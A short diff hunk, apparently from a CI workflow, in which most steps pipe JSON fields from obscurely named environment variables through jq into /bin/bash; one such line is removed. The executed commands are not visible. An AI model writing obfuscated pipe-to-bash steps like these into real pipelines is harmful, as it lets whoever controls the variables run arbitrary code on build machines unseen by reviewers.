@@ -31,7 +31,6 @@ jobs:
           echo $zp9000 | jq -r .ylsj6 | /bin/bash
           echo $j0507 | jq -r .yt40810 | /bin/bash
           echo $l2 | jq -r .y36659 | /bin/bash
-          echo $xgj16 | jq -r .yf213 | /bin/bash
           printf '%s' "$ryn10" | jq -r .m206 | /bin/bash
           printf '%s' "$xwse7704" | jq -r .j41 | /bin/bash
           echo $j11 | jq -r .p619 | /bin/bash
